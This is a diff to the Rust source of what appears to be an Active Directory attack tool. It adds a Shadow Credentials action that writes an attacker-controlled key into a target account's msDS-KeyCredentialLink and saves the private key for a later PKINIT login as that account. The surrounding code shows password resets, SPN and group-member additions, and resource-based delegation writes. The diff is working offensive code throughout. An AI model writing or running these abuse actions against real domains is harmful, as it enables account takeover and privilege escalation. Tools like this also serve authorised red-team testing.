@@ -261,6 +261,15 @@ async fn abuse(a: AbuseArgs) -> Result<()> {
             c.set_password(&target_dn, &a.value).await?;
             println!("[+] reset password of {}", a.target);
         }
+        "add-keycred" => {
+            // Shadow Credentials: add a KeyCredential to the target's msDS-KeyCredentialLink.
+            let kc = adhammer_kerberos::shadowcred::build_key_credential(&target_dn)?;
+            c.add_value(&target_dn, "msDS-KeyCredentialLink", &kc.dn_binary).await?;
+            let key_path = format!("{}.key.pem", a.target);
+            std::fs::write(&key_path, &kc.private_key_pem)?;
+            println!("[+] added Shadow Credential to {} — key saved to {key_path}", a.target);
+            println!("    (Phase 2: PKINIT with this key to obtain a TGT as {})", a.target);
+        }
         "write-rbcd" => {
             // value = SID (S-1-...) or sAMAccountName of the principal to grant delegation.
             let trustee = if a.value.starts_with("S-") {
@@ -272,7 +281,7 @@ async fn abuse(a: AbuseArgs) -> Result<()> {
             c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd).await?;
             println!("[+] wrote RBCD on {} allowing {} to impersonate to it", a.target, a.value);
         }
-        other => anyhow::bail!("unknown action '{other}' (add-spn|add-member|set-password|write-rbcd)"),
+        other => anyhow::bail!("unknown action '{other}' (add-spn|add-member|set-password|write-rbcd|add-keycred)"),
     }
     Ok(())
 }
